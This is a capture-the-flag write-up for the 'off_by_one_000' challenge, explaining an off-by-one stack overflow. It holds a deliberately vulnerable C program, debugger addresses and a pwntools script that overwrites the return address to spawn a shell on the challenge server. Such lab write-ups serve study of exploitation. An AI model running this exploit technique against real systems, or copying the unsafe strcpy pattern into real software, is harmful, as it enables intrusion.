---
layout: post
title:  "off_by_one_000"
date:   2023-12-09 14:31:56 +0000
categories: writeup
---

{% highlight c %}
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>

char cp_name[256];

void get_shell() {
    system("/bin/sh");
}

int cpy() {
    char real_name[256];
    strcpy(real_name, cp_name);
    return 0;
}

int main() {
    printf("Name: ");
	read(0, cp_name, sizeof(cp_name)); // off by one happens here!

    cpy();

    printf("Name: %s", cp_name);

    return 0;
}
{% endhighlight %}

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

```
pwndbg> p &cp_name
   $2 = (<data variable, no debug info> *) 0x0804a060 <cp_name>

pwndbg> disass cpy
   0x0804864c <+0>:     push   ebp

pwndbg> disass get_shell
   0x080485db <+0>:     push   ebp
```

- On input `'a'*256` returns Seg-fault from cpy().
	- For some reason, that's because the ret address for main() is overwrited to '0x61616161'.
	- So all I need to do is to write 64 of get_shell() address for the "Name"...
get_shell() : 0x080485db

## Solution

{% highlight python %}
#!/usr/bin/env python3
from pwn import *

conn = remote("host3.dreamhack.games", 17208)
# conn = process("off_by_one_000")

conn.recvuntil(b"Name: ")
payload = p32(0x080485db)*64
conn.send(payload)
conn.interactive()
{% endhighlight %}

🚩

## How does it work?

When `'a' * 256` is inserted to .data this is how it looks like.
![[스크린샷 2023-12-09 141639.png]]
Since the 256th byte is not null the 257th byte gets to be part of the string too.(off by one)

This is when it's inserted in the "real_name" in cpy().
![[스크린샷 2023-12-09 141606.png]]
- As highlighted, the last NULL byte was inserted in too. 
- Hence making "prev ebp address" to "0xffffd400" which is in the middle of the "real_name".
- Therefore after coming back to main(), every data on the stack is what I wrote for the "cp_name".
- `printf("Name: %s", cp_name);`  doesn't matter since it uses "cp_name".
- But when `ret` of main(), the ret address to be popped is overwritten to "0x61616161"!!
